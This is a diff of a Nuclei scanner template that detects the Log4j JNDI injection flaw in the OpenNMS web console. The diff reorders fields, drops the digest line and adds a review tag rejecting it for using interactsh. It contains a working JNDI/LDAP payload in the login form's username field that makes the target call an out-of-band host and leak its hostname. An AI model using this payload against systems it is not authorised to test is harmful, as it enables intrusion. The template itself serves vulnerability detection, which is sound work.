@@ -1,5 +1,4 @@
 id: opennms-log4j-rce
-
 info:
   name: OpenNMS - JNDI Remote Code Execution (Apache Log4j)
   author: johnk3r
@@ -18,51 +17,45 @@ info:
     cwe-id: CWE-77
     cpe: cpe:2.3:a:opennms:horizon:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    runzero-review: REJECT/2025-11-07/uses interactsh
     max-request: 1
-    shodan-query: title:"OpenNMS Web Console"
     product: horizon
+    shodan-query: title:"OpenNMS Web Console"
     vendor: opennms
-  tags: jndi,log4j,rce,opennms,cve,cve2021,kev,oast,vuln
+    verified: true
+  tags: cve,cve2021,jndi,kev,log4j,oast,opennms,rce,vuln
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
-
 http:
-  - raw:
+  - extractors:
+      - kval:
+          - interactsh_ip
+        type: kval
+      - group: 2
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+      - group: 1
+        part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+      - part: interactsh_request
+        regex:
+          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+        type: regex
+    matchers-condition: and
+    raw:
       - |
         POST /opennms/j_spring_security_check HTTP/1.1
         Referer: {{RootURL}}/opennms/login.jsp
         Content-Type: application/x-www-form-urlencoded
 
         j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-    extractors:
-      - type: kval
-        kval:
-          - interactsh_ip
-
-      - type: regex
-        part: interactsh_request
-        group: 2
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
-# digest: 4a0a0047304502206814c3a1df924e136e40db613cedf8d1e7db1f496c2442f58a2a90560066cf090221009e7dcb982fb23fc7dace49de8fe7c8ed4f4ca891469272e34e0bfc44a8bf8cfc:922c64590222798bb761d5b6d8e72950
